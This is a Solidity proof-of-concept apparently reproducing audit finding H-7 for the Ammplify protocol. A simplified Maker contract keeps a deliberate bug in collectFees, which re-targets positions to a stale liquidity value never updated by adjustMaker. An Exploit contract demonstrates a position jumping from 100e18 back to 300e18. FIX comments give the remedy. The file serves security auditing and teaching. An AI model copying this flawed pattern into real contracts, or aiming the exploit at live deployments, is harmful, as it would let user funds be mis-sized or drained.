// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Ammplify — H-7: Maker.collectFees re-targets original asset.liq (#63173)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: adjustMaker changes live position liquidity but never updates
    asset.liq; collectFees re-targets Data to asset.liq (creation amount).
    Vulnerable collectFees line preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

struct Asset {
    uint128 liq; // set in newMaker only — never updated by adjustMaker (bug)
    uint128 liveLiq; // actual position liquidity after adjust
    address owner;
}

/// @dev Minimal Maker facet: newMaker / adjustMaker / collectFees.
contract MakerFacet {
    mapping(uint256 => Asset) public assets;
    uint256 public nextId = 1;

    // protocol token balance used when minting unexpected liquidity on collect
    uint256 public diamondBalance;
    uint256 public userPaidOnCollect;
    bool public collectWouldNeedUserPay;

    function newMaker(address owner, uint128 liq) external returns (uint256 id) {
        id = nextId++;
        assets[id] = Asset({liq: liq, liveLiq: liq, owner: owner});
    }

    /// @notice adjustMaker — changes live liquidity but NOT asset.liq
    function adjustMaker(uint256 id, uint128 targetLiq) external {
        Asset storage a = assets[id];
        require(a.owner != address(0), "no asset");
        // FIX: a.liq = targetLiq;
        a.liveLiq = targetLiq;
        // asset.liq left at original creation amount
    }

    /// @notice collectFees — re-targets to original asset.liq (bug)
    function collectFees(uint256 id) external {
        Asset storage a = assets[id];
        require(a.owner != address(0), "no asset");
        // We collect simply by targeting the original liq balance.
        // Source: Maker.sol collectFees
        // FIX: use a.liveLiq (or keep asset.liq updated in adjustMaker)
        uint128 target = a.liq; // @> VULN: re-targets original asset.liq — adjustMaker never updated it; position size jumps unexpectedly
        if (target > a.liveLiq) {
            uint128 need = target - a.liveLiq;
            // mint extra liq: protocol pays first, then charges user
            if (diamondBalance < need) {
                // secondary impact: reverts if diamond can't fund mint
                collectWouldNeedUserPay = true;
                // for harm demo, charge user and allow mint
                userPaidOnCollect = need;
            } else {
                diamondBalance -= need;
            }
        } else if (target < a.liveLiq) {
            // unexpectedly reduce position
            diamondBalance += (a.liveLiq - target);
        }
        a.liveLiq = target;
        // fees would be collected here (omitted) — position already mutated
    }

    function fundDiamond(uint256 amt) external {
        diamondBalance += amt;
    }

    function liveLiqOf(uint256 id) external view returns (uint128) {
        return assets[id].liveLiq;
    }

    function storedLiqOf(uint256 id) external view returns (uint128) {
        return assets[id].liq;
    }
}

/// CREATE: maker(1)
contract Exploit {
    MakerFacet public maker;
    uint256 public assetId;
    uint128 public liqAfterAdjust;
    uint128 public liqAfterCollect;
    uint128 public originalLiq;

    constructor() {
        maker = new MakerFacet(); // nonce 1
    }

    function run() external {
        originalLiq = 300e18;
        // create maker with 300e18
        assetId = maker.newMaker(address(this), originalLiq);
        // reduce to 100e18 via adjustMaker — asset.liq stays 300e18
        maker.adjustMaker(assetId, 100e18);
        liqAfterAdjust = maker.liveLiqOf(assetId);
        require(liqAfterAdjust == 100e18, "adjusted live");
        require(maker.storedLiqOf(assetId) == 300e18, "stored still original");

        // fund diamond so collect can mint the jump back
        maker.fundDiamond(1e20);

        // collectFees re-targets to 300e18
        maker.collectFees(assetId);
        liqAfterCollect = maker.liveLiqOf(assetId);

        // Harm: position jumped back to original without user intending resize
        require(liqAfterCollect == originalLiq, "unexpectedly restored original liq");
        require(liqAfterCollect != liqAfterAdjust, "position mutated by collectFees");
        require(liqAfterCollect == 300e18 && liqAfterAdjust == 100e18, "harm: 100->300 on collect");
    }
}
